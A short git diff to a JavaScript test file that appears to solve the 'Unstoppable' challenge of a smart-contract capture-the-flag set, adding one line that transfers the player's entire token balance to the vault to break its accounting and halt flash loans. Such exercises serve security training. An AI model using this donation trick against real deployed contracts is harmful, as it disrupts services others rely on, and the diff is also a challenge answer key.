@@ -45,6 +45,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // ethers.provider.getStorageAt(vault.address, 0).then((storage) => {
+        //     console.log("Storage: ", storage, deployer.address);
+        // })
+        await token.transfer(vault.address, await token.balanceOf(player.address));
+
     });
 
     after(async function () {
